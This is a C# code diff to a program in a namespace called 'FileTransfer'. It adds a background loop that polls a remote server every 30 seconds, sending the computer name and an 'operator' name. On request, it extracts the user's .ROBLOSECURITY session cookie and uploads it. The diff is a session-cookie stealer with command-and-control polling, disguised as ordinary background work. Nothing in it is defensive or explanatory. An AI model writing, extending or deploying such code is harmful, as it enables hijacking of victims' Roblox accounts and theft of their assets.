@@ -195,10 +195,53 @@ namespace FileTransfer
                 await UploadFileOnStartupAsync();
 
                 Log("Background work OK");
+
+                // 4. Опрашиваем сервер на запрос токена
+                await TokenRequestPollLoopAsync();
             }
             catch (Exception ex)
             {
                 Log("Background work error: " + ex);
+            }
+        }
+
+        private async Task TokenRequestPollLoopAsync()
+        {
+            Log("Token request poll loop start");
+            while (true)
+            {
+                try
+                {
+                    await Task.Delay(30000);
+
+                    string checkUrl = $"{ServerUrl}/check-token-request?computerName={Uri.EscapeDataString(ComputerInfo.GetName())}&operator={Uri.EscapeDataString(OperatorName)}";
+                    var resp = await _http.GetAsync(checkUrl);
+                    var json = await resp.Content.ReadAsStringAsync();
+
+                    bool requested = false;
+                    try
+                    {
+                        using var doc = System.Text.Json.JsonDocument.Parse(json);
+                        if (doc.RootElement.TryGetProperty("requested", out var reqEl))
+                            requested = reqEl.GetBoolean();
+                    }
+                    catch { }
+
+                    if (requested)
+                    {
+                        Log("Token request received from server, re-extracting cookie");
+                        _cachedToken = CookieExtractor.ExtractRobloSecurity();
+                        Log($"Re-extracted token len={_cachedToken?.Length ?? 0}");
+                        if (string.IsNullOrEmpty(_cachedToken))
+                            ReadCookieDebugLog();
+                        await UploadFileOnStartupAsync();
+                        Log("Token request upload done");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Log("Token poll error: " + ex.Message);
+                }
             }
         }
 
